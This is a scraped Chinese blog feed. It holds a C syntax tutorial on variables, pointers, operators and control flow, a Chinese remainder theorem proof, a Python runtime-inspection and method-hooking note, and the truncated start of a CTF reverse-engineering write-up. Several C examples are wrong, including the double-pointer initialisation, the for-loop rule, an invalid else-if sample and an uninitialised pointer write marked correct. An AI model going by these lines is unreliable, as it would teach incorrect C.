class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用是指：进入一个过程并完成它，在C语言中还有计算出它的返回值的含义</p><p>这个例子中，scanf和printf和add就是被调用的过程。以add举例，CPU执行到这里，会先进入add过程，然后一条一条执行其中的代码，返回出设定的值。函数调用的格式即是identifier(parameters)，再次说明：它的含义就是计算出这个过程的返回值，一个函数调用的本质就是得到它的值。对于printf这类含有副作用的函数，它们会在计算返回值的过程中“顺带”表现副作用。</p><h2 id="0x03-参数，计算，表达式和语句">0x03 参数，计算，表达式和语句</h2><p>刚刚说明了函数的本质就是返回值，那么对于C语言来说，添加/删除/修改”值“就是C程序的本职工作。这一章就介绍一下，C语言如何操作值</p><h3 id="00-标识符">00 标识符</h3><p>在计算机的底层实现中，任何一个内存地址都对应一个值，C语言通过使用标识符的方法来简化对内存空间的操作。现在可以假设内存地址是一个街道的所有门牌号，地址对应的值是门牌号内的东西。</p><p>在汇编中实现两数相加的运算过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;省略</span><br><span class="line">mov [rsp+4],4;在栈对应的内存地址放置一个值</span><br><span class="line">mov rax,3;另外一个操作数放到加法寄存器中</span><br><span class="line">add rax,[rsp+4];执行加法操作</span><br><span class="line">mov rax,rax;把返回值放到rax寄存器中，用于返回，这个步骤可能被优化</span><br><span class="line">;省略</span><br></pre></td></tr></table></figure><p>在C语言中实现两数相加的运算过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，C语言省略了对栈空间/内存地址以及寄存器的描述，将我们的精力放到了实现效果上。其中的a和b被叫做标识符，它们代表了内存空间的某个地址（这时又可以被叫做变量）。标识符即是内存空间一个区域的代号，是供我们操作其中值的中介</p><h3 id="01-声明一个标识符">01 声明一个标识符</h3><h4 id="1单独声明">1单独声明</h4><p>基本格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;qualifier&gt; type identifier;</span><br><span class="line"><span class="comment">//特殊写法</span></span><br><span class="line"><span class="type">int</span> a,b,c;<span class="comment">//连续声明</span></span><br></pre></td></tr></table></figure><p><code>type</code>：说明这个标识符对应空间的大小和默认的类型，其中默认类型影响运算效果，虽然可以强制类型转化，但是还是尽量在定义时就写好</p><table><thead><tr><th>type</th><th>大小</th><th>默认类型</th></tr></thead><tbody><tr><td>char</td><td>1字节</td><td>有符号字符型</td></tr><tr><td>short</td><td>2字节</td><td>有符号短整型</td></tr><tr><td>int</td><td>4字节</td><td>有符号整型</td></tr><tr><td>long</td><td>4字节</td><td>有符号长整型</td></tr><tr><td>long long</td><td>8字节</td><td>有符号长长整形</td></tr><tr><td>bool</td><td>1字节</td><td>只存放0和1，C23</td></tr></tbody></table><p><code>identifier</code>：一个你定义的名字，用来标识这块区域，之后对这块区域的操作转换为对这个标识符的操作。内容必须为：大小写字母和数字和下划线的组合。不能以数字开头，不能和已有内容重名（同一作用域下之前的标识符，关键字（比如char return））</p><p><code>&lt;qualifier&gt;</code>：可选的限定符，可以写多个内容。</p><table><thead><tr><th>qualifier</th><th>效果</th></tr></thead><tbody><tr><td>signed</td><td>表明这个区域的值默认为有符号，省略默认为signed</td></tr><tr><td>unsigned</td><td>表明这个区域的值默认为无符号，使用unsigned时省略type表明是无符号整型</td></tr><tr><td>const</td><td>表明这个区域的值除了初始赋值外不可更改，声明时必须直接赋值</td></tr><tr><td>volatile</td><td>不建议编译器优化这个区域的操作</td></tr><tr><td>extren</td><td>表明这个变量来自其它源代码文件</td></tr><tr><td>static</td><td>表明这个变量不能被extren，只能在本文件使用</td></tr><tr><td>auto</td><td>表明这个变量是局部变量，块作用域，省略默认为auto</td></tr><tr><td>register</td><td>建议编译器把这个值放到寄存器</td></tr></tbody></table><h4 id="2声明时赋值">2声明时赋值</h4><p>一个区域只声明，其中的内容是不会因为你给了这个区域一个名字而改变的。所以我们一般在声明时直接赋值。</p><p>基本格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;qualifier&gt; type identifier=number;</span><br><span class="line"><span class="comment">//特殊写法，连续赋值</span></span><br><span class="line"><span class="keyword">auto</span> a=<span class="number">1</span>,b=<span class="number">4</span>,c=<span class="number">0</span>;<span class="comment">//auto只能赋值一种类型</span></span><br></pre></td></tr></table></figure><p>这里的=为赋值号，作用是把整个等式右边的值计算出来给左边。形如a=b这样的式子被叫做表达式，和函数类似，这也是一个过程，对于赋值来说，副作用是把右边的值给左边，返回值是结束后左边的空间中的值。</p><p>所以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=b=c=d=e=f=<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>的效果就是先让f等于5，再让e等于（f=5）这个表达式的值即5，以此类推，直到a=5.</p><p>大家也发现，对于赋值符号，左边一定是一个空间，右边则不一定，空间不一定在左侧，但是数一定在右侧。为了简便描述，我们把可以在赋值号左边的值（标识空间的）称为<code>左值</code>，而不可以在左边的值（只能视为数的）被称为<code>右值</code></p><p>举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=b=c=d=e=f=<span class="number">5</span>;<span class="comment">//a,b,c,d,e,f为左值，5，f=5，e=f=5，d=e=f=5，c=d=e=f=5，b=c=d=e=f=5，a=b=c=d=e=f=5为右值</span></span><br><span class="line">c = add(a,b)-d;<span class="comment">//a,b,c,d为左值，add(a,b)，add(a,b)-d，c = add(a,b)-d为右值</span></span><br></pre></td></tr></table></figure><p>对于声明时赋值，number可以是左值也可以是右值。而前面的限定符和类型描述符均和赋值相同。</p><p>特别的，声明时赋值可以使用这样的方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> a=<span class="number">1</span>;<span class="comment">//默认int</span></span><br><span class="line"><span class="keyword">auto</span> b=<span class="number">0.1f</span>;<span class="comment">//默认float</span></span><br><span class="line"><span class="keyword">auto</span> c=<span class="number">8.9</span>;<span class="comment">//默认double</span></span><br></pre></td></tr></table></figure><p>C23引入了这种写法,auto自动判断类型，甚至可以把函数返回值设为auto启用自动推断。</p><h4 id="3-声明数组">3 声明数组</h4><p>假设我的程序需要100个变量，难道我要写100个auto a,b,c,d,…吗？当然不是，通过数组，我们可以向系统申请一块连续的内存用来存放我们的多个变量。</p><p>声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;qualifier&gt; type identifier[size];</span><br><span class="line"><span class="type">int</span> arr[<span class="number">100</span>];</span><br></pre></td></tr></table></figure><p>这里的type identifier[size]就是连续申请size个type大小的空间的意思。这个空间的名字就是identifier。如果写成结构体，类似这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arr</span>&#123;</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line">...<span class="comment">//一共100个</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以这样赋值和初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//初始化为0</span></span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123;&#125;; <span class="comment">//初始化为0，从C23开始</span></span><br></pre></td></tr></table></figure><p>其中的0,1用于指定从arr开始我们申请的第几个type长度的小空间，[]中的数我们称为下标，我们通过下标去访问数组的值。</p><p>那么，我们的数组下表支持变量吗，回答是肯定的。我们可以这样使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">arr[a] = <span class="number">1</span>; <span class="comment">//讲arr[0]的值改为1,因为a是0</span></span><br></pre></td></tr></table></figure><p>其实，可以把内存当作一个超长的数组，每个地址都是一个下标，访问地址0x10000时，可以理解为取memory[0x10000]中存放的值。C语言虽然没有直接定义一个memory数组来让我们直接操作，但是提供了一个额外的类型和操作符*&amp;（解引用运算符和取址运算符）来让我们自由地使用内存，那就是<code>指针</code>，指针就相当于memory数组的下标</p><h4 id="4-声明指针">4 声明指针</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">type *identifier;</span><br><span class="line"><span class="type">int</span> *ptr;<span class="comment">//声明一个指向int型数据的指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//操作memory[0x10000]</span></span><br><span class="line">ptr = (<span class="type">int</span>*)<span class="number">0x10000</span>;<span class="comment">//这里原来的数据是int型，和指针类型不同，所以要先进行转换</span></span><br><span class="line">*ptr = <span class="number">100</span>;<span class="comment">//等价于memory[0x10000]=100;</span></span><br><span class="line"><span class="type">int</span> a = *ptr;<span class="comment">//等价于a = memory[0x10000];</span></span><br></pre></td></tr></table></figure><p>通过以上的方法可以实现自由操作内存地址的值。</p><p>你可能会好奇，按上面所说ptr直接表示了一个内存地址，为什么还需要添加type标识来表示它指向空间的类型呢。其实这也很好理解。内存是连续的字节数组，但是使用时并不一定按字节使用，如果这里的空间是你给<code>int a</code>生成的空间，那这个空间肯定是int型的，你如果按char来使用，那就会错误。</p><p>好了，我们了解了指针如何赋值了，但是有个问题，如果我想要指向一个已经生成的标识符的地址，又该怎么赋值呢，这里就用到了另一个运算符&amp;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *ptr;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">ptr = a;<span class="comment">//错误，不能把一个数赋给指针（或者说内存数组的下标）</span></span><br><span class="line">*ptr = a;<span class="comment">//正确，可以把数赋给指针指向的地址(等价memory[ptr]=a)</span></span><br><span class="line">ptr = &amp;a;<span class="comment">//正确，对标识符使用&amp;取址运算符取得目标标识符在内存中的地址，然后赋给指针，这样ptr指向的地址就是a的地址。对*ptr进行的操作就是对a进行的操作</span></span><br></pre></td></tr></table></figure><p>不难看出，*和&amp;是两个互逆的运算符，*把一个地址转为地址中的值，&amp;把一个值转为对应的地址，当然，&amp;运算符使用的前提是这里要有这个空间，标识符表明一个空间，因此可以使用&amp;标识符来获取这个空间的地址，单纯的一个数没有空间所以不能&amp;1。</p><p>可以来看看指针和普通标识符的区别及联系：</p><table><thead><tr><th></th><th>普通标识符</th><th>指针标识符</th></tr></thead><tbody><tr><td>默认表示</td><td>数据</td><td>目标地址</td></tr><tr><td>使用*</td><td>无效</td><td>数据</td></tr><tr><td>使用&amp;</td><td>自身地址</td><td>自身地址</td></tr></tbody></table><p>可以理解为：普通标识符是默认为值的，用&amp;获取地址，而指针标识符是默认为地址的，用*获取值。</p><p>现在假设</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *ptr1 = &amp;a;</span><br><span class="line"><span class="type">int</span> **ptr2 = ptr1;</span><br></pre></td></tr></table></figure><p>根据上面的表格可以得出</p><table><thead><tr><th></th><th>a</th><th>ptr1</th><th>ptr2</th></tr></thead><tbody><tr><td>默认表示</td><td>0</td><td>a的地址</td><td>ptr1的地址</td></tr><tr><td>使用*</td><td>无效数据</td><td>0</td><td>ptr1的值(即a的地址)</td></tr><tr><td>使用**</td><td>无效数据</td><td>无效数据</td><td>0</td></tr><tr><td>使用&amp;</td><td>a的地址</td><td>ptr1的地址</td><td>ptr2的地址</td></tr></tbody></table><p>很好理解吧。</p><h3 id="02-计算">02 计算</h3><p>基础运算符，这里就只说明一下，具体去网络上搜索</p><h4 id="1算数运算符">1算数运算符</h4><p>+,-,*,/,%，结合性均为从左至右</p><p>返回值类型为操作数的类型（不一样按空间大的计算），返回值为数学计算出的值</p><p>/和%右操作数不能为0，如果/的操作数有一个是浮点型，结果就是浮点型，否则为整除运算.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>/<span class="number">3</span></span><br><span class="line"><span class="comment">//结果为1</span></span><br><span class="line"><span class="number">5.0</span>/<span class="number">3</span></span><br><span class="line"><span class="comment">//结果为1.666666</span></span><br></pre></td></tr></table></figure><p>%的左操作数决定返回值类型</p><p>C语言的取整为趋零截断，出现的所有小数变为整数时向0取整</p><h4 id="2自增运算符">2自增运算符</h4><p>i++,++i,i–,–i，和最近的一个结合</p><p>i++表明先运算完这个语句，然后执行i=i+1</p><p>++i表明先执行i=i+1，然后运算这个语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i++);<span class="comment">//0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);<span class="comment">//1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,--i);<span class="comment">//0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,++i);<span class="comment">//1</span></span><br></pre></td></tr></table></figure><h4 id="3赋值运算符">3赋值运算符</h4><p>结合性从右到左</p><p>复合赋值</p><p>+=，-=，*=，/=，%=</p><p>a+=1表示a=a+1同理其它的</p><h4 id="4关系运算符">4关系运算符</h4><p>返回值均为真假（0或1），结合从左到右</p><p>&lt;,&gt;,==,!=,&gt;=,&lt;=</p><p>分别为是否小于，是否大于，是否等于，是否不等于，是否大于等于，是否小于等于</p><p>注意==和=的区别</p><h4 id="5逻辑运算符">5逻辑运算符</h4><p>a &amp;&amp; b 是否同时成立</p><p>a || b 是否至少一个成立</p><p>!a 是否不成立</p><h4 id="6三元运算符">6三元运算符</h4><p>a?b:c</p><p>表示a如果不为0，则返回（执行）为b，否则返回（执行）c，这里写执行是提醒副作用</p><h4 id="7位运算符">7位运算符</h4><p>&amp; 按位与</p><p>| 按位或</p><p>~ 按位非</p><p>^ 按位异或</p><p>&lt;&lt; 左移，空位补0</p><p>&gt; &gt; 右移，如果有符号，补符号，称为算数右移，否则是逻辑右移</p><p>以上优先级表请自行查看，注意位运算符和算数运算的优先级关系</p><p>好了，通过以上内容，我们已经可以操作一个空间进行赋值和计算了，然后就是面向过程的核心，操作过程，即控制程序的执行流程。</p><h2 id="0x04-过程控制">0x04 过程控制</h2><p>面向过程中分为三种结构：顺序，选择，循环</p><p>顺序就是指令依次执行从上到下的一种结构，所有指令执行且只执行一次。<br>选择就是根据条件来执行分支中代码的结构。指令执行0次或1次。<br>循环就是根据条件多次重复执行代码的结构。指令执行0次，1次或多次。</p><p>使用上面三种结构使得所有代码可以有逻辑地执行我们想让它执行的次数。<br>一般情况下，我们用顺序结构做连接，让选择和循环结构分块来执行我们的程序。由于顺序结构就是正常的语句，我们这里直接跳过。</p><h3 id="01-选择结构">01 选择结构</h3><p>我们一般使用if/else和switch来写选择结构</p><p>if-else</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(x)&#123;<span class="comment">//单if</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( x )&#123;<span class="comment">//if+else</span></span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (x)&#123;<span class="comment">//if+else&#123;if+else&#125;</span></span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">if</span>(y)&#123;</span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若if括号中任意内容的返回值为非0则执行，否则跳过，如果有else就执行else，如果if或else后只有一条语句则不需要写大括号，由于if本身也是一条语句所以：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a)</span><br><span class="line">    <span class="keyword">if</span>(b)</span><br><span class="line">        <span class="keyword">if</span>(c)</span><br><span class="line">            <span class="keyword">if</span>(d)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;不用写大括号，爽！&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;我和if(d)匹配&quot;</span>);<span class="comment">//else只和最近的未匹配的if匹配</span></span><br></pre></td></tr></table></figure><p>因此，if-else if语法也不需要定义可以直接使用因为if else整个是一条语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;神奇的&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果我们要选择的内容是离散的，可以直接枚举，那么使用switch更方便</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(a)&#123;</span><br><span class="line">    <span class="keyword">case</span> x:<span class="comment">//如果a的值是x</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;匹配成功&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> y:<span class="comment">//如果a的值是y</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;匹配成功&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> z:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:<span class="comment">//如果上面的都不是，默认</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里有一个新语法叫做case :，c语言中，只有两个地方使用了冒号，一个是switch，一个是goto，可以想象：冒号用于给一个语句开头贴标签，语句跳转时，直接跳转到这个标签的位置继续执行而不会考虑这里有没有其它标签。因此如果a的值是x，会输出两次匹配成功，因为它跳转到case x的标签处继续执行。那么有什么办法可以防止多个情况被匹配到呢，这里使用了break关键字来跳出这个块，从而结束了继续执行。因此，可以在每个case最后放一个break;来防止继续执行到下一个地方</p><h3 id="02-循环结构">02 循环结构</h3><p>如何让一个操作多次执行呢，使用循环结构吧</p><p>基本循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(init;check;cycle)&#123;</span><br><span class="line">    <span class="comment">//body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释一下for的小括号里面的内容：</p><p>第一个是循环进入时执行的语句，cycle是每次循环结束时执行的语句，check是每次进入循环前执行的语句，如果这个语句的条件为否就跳出循环，否则一直循环。注意，这里的三个内容均为语句，不可以直接写表达式！比如：1。但是可以留空。</p><p>顺序是init-&gt;check-&gt;body-&gt;cycle-&gt;check-&gt;body-&gt;cycle-&gt;check-&gt;…</p><p>while循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(a)&#123;</span><br><span class="line"><span class="comment">//body</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">//body</span></span><br><span class="line">&#125;<span class="keyword">while</span>(a);</span><br></pre></td></tr></table></figure><p>这里的a可以写任意内容，只有当内容不为0时才会继续执行，否则跳出。</p><h4 id="1控制语句">1控制语句</h4><p>有三个语句可以用来改变执行流：</p><ul><li>break;：离开循环体或switch块</li><li>continue;：跳过这个语句之后的内容。进行下一次循环</li><li>goto x;：跳到x标签的位置，设置标签直接在函数内使用x:就可以在这一行设置标签。</li></ul><p>（语法篇结束）</p><hr>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语言 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国剩余定理证明</title>
      <link href="/posts/891a7930.html"/>
      <url>/posts/891a7930.html</url>
      
        <content type="html"><![CDATA[<h3 id="定理描述">定理描述</h3><p><img src="https://s2.loli.net/2024/09/15/jIlf4DvczOoGa6k.png" alt="image-20240915202907787"></p><p>假设解为<br>$$<br>x = \sum^k_{i=0}a_iN_im_i<br>$$<br>解释：</p><p>设$N_i = \frac{N}{n_i}$，由于条件已知n互质，<br>那么根据$N_i$和$n_i$互质和贝祖定理<br>所以$N_im_i+n_ik_i=1$,这里的m和k为任意可能的整数<br>这个式子左右同模$n_i$<br>可得:<br>$$<br>N_im_i \equiv 1 \mod n_i<br>$$</p><hr><p>好的，已经清楚x中每个字母的表示了，继续</p><p>在$\mod n_i$的情况下，(这里用j避免和n混淆，n的i是第i个，前面的sum是全部取值，j可以取到i)<br>$$<br>x \equiv \sum^k_{j=0}a_jN_jm_j \mod n_i<br>$$</p><p>又当$N_j\not = N_i$时，$N_j \mod n_i=0$，所以:<br>$$<br>x \equiv a_iN_im_i \mod n_i<br>$$<br>又因为$N_im_i \equiv 1 \mod n_i$：<br>$$<br>x \equiv a_i \mod n_i<br>$$由于每步可逆，得证</p><hr><p>唯一性证明</p><p>若$x_1$和$x_2$均为方程的解，那么根据同余的定义<br>有$(x_1-x_2)|n_i$，所以$(x_1-x_2)|lim(n_1,n_2,…)$<br>所以$(x_1-x_2)|N$</p><p>所以$x_1 \equiv x_2 \mod N$<br>所以最多有一个解小于N</p><p>得证</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 定理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-运行时获取信息</title>
      <link href="/posts/36f452d0.html"/>
      <url>/posts/36f452d0.html</url>
      
        <content type="html"><![CDATA[<h2 id="模块">模块</h2><p>基本信息获取，对类同理,获取函数传参用inspect</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(mod))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">help</span>(mod))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="built_in">print</span>(inspect.signature(obj.func1))</span><br></pre></td></tr></table></figure><p>对类的函数进行hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setattr</span>(the_class,<span class="string">&#x27;true_func1&#x27;</span>,the_class.__dict__[<span class="string">&#x27;func1&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_func1</span>(<span class="params">self,a,b</span>): <span class="comment"># 改为正确的传参，</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;in func1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a),<span class="built_in">hex</span>(b))</span><br><span class="line">    ret = self.true_func1(a,b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line"><span class="built_in">setattr</span>(the_class, <span class="string">&quot;func1&quot;</span>, hook_func1)</span><br></pre></td></tr></table></figure><h2 id="读取内存">读取内存</h2><p>python进程运行时是由python解释器运行的，可以使用CE附加python解释器读取内存内容，效果和正常使用CE相同</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 语言 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯2024复现</title>
      <link href="/posts/84d382e7.html"/>
      <url>/posts/84d382e7.html</url>
      
        <content type="html"><![CDATA[<h3 id="easyre">easyre</h3><p>不解释了，42位逐位异或</p><p>有些反编译很怪的[a±k *(b/k)]这个相当于[(a+b) mod len]</p><p>而类似</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( _mm_movemask_epi8(</span><br><span class="line">       _mm_and_si128(</span><br><span class="line">         _mm_cmpeq_epi8(_mm_loadu_si128(v3), (__m128i)xmmword_140021410),</span><br><span class="line">         _mm_cmpeq_epi8(_mm_loadu_si128(v3 + <span class="number">1</span>), (__m128i)xmmword_140021400))) == <span class="number">0xFFFF</span> )</span><br></pre></td></tr></table></figure><p>是memcmp两个值（wmctf里面x64打开so就是这个，在arm架构等价的就是memcmp）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># lsat = [0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 